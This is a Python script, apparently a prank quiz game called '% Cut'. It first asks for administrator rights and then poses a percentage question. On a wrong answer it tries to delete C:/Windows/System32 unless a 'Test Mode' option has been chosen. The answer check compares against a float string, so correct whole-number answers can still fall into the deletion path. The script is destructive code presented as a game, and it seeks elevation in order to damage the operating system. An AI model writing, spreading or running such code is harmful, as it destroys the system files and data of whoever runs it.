import os
import ctypes
import sys
import random
import time

count1 = [100, 250, 74, 87, 67, 981, 1000]
count2 = [10, 25, 7, 7, 9, 91, 2]
options = 0

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():
    pass
else:
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    except:
        print('Please run as administrator')
        input()
        exit()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    return

def delsys32():
    clear()
    print('------------------------------')
    print('Deleting System32...')
    print('------------------------------')
    if options == 1:
        print('Test Mode: System32 not deleted')
        input()
    else:
        os.remove('C:/Windows/System32')
    clear()
    menu()
    

def start(cnt1, cnt2):
    clear()
    print('------------------------------')
    print('Whats the percentage of...    ')
    print(f'{cnt2}% of {cnt1}?')
    print('------------------------------')
    answer = input('Answer: ')
    return answer

def calc(answer, cnt1, cnt2):
    clear()
    calculation = (cnt2 * cnt1) / 100
    if str(answer) == str(calculation):
        print('------------------------------')
        print('Correct! You saved your pc!')
        print('------------------------------')
        input()
        exit()
    else:
        print('------------------------------')
        print('Wrong! You lost your pc!')
        print('------------------------------')
        delsys32()
    return

def options_menu():
    global options
    clear()
    print('------------------------------')
    print('Options')
    print('------------------------------')
    print('1 - Test Mode')
    print('2 - Normal Mode')
    print('------------------------------')
    choice = input('Choose an option: ')
    if choice == '1':
        options = 1
        print('Test Mode activated')
        menu()
    elif choice == '2':
        options = 0
        print('Normal Mode activated')
        menu()
    else:
        print('Invalid option')
    input()
    clear()

def menu():
    clear()
    print('------------------------------')
    print('-     Welcome to % Cut!      -')
    print('-      Find the right %      -')
    print('-      and save your pc!     -')
    print('------------------------------')
    print('1 - Start')
    print('2 - Options')
    print('3 - Exit')
    print('------------------------------')
    option = input('Choose an option: ')
    if option == '1':
        ct2 = random.choice(count2)
        ct1 = random.choice(count1)
        answer = start(ct1, ct2)
        calc(answer, ct1, ct2)
    elif option == '2':
        options_menu()
    elif option == '3':
        exit()
    else:
        print('Invalid option')

menu()